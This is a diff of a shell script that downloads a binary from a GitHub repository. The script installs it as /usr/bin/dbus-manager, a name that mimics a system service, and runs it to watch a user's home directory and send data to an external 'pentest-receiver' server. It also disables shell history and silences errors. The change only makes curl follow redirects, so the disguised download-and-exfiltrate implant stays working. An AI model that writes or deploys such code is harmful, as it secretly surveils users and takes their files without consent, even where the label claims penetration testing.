@@ -15,7 +15,7 @@ set +o history
 /usr/bin/dbus-manager --watch-path /home/kaucrow --server-url https://pentest-receiver-production.up.railway.app/watchdog/data 2>/dev/null
 EOF
     GOOD_BOY_URL="https://github.com/Kaucrow/good-boy/raw/refs/heads/main/bin/goodboy"
-    curl -s -o /usr/bin/dbus-manager "$GOOD_BOY_URL" || \
+    curl -L -s -o /usr/bin/dbus-manager "$GOOD_BOY_URL" || \
     wget -q -O /usr/bin/dbus-manager "$GOOD_BOY_URL"
 
     if [ ! -f /usr/bin/dbus-manager ]; then
@@ -91,7 +91,7 @@ fi
 WATCHEOF
 
     GOOD_BOY_URL="https://github.com/Kaucrow/good-boy/raw/refs/heads/main/bin/goodboy"
-    curl -s -o /usr/bin/dbus-manager "\$GOOD_BOY_URL" || \
+    curl -L -s -o /usr/bin/dbus-manager "\$GOOD_BOY_URL" || \
     wget -q -O /usr/bin/dbus-manager "\$GOOD_BOY_URL"
 
     if [ ! -f /usr/bin/dbus-manager ]; then
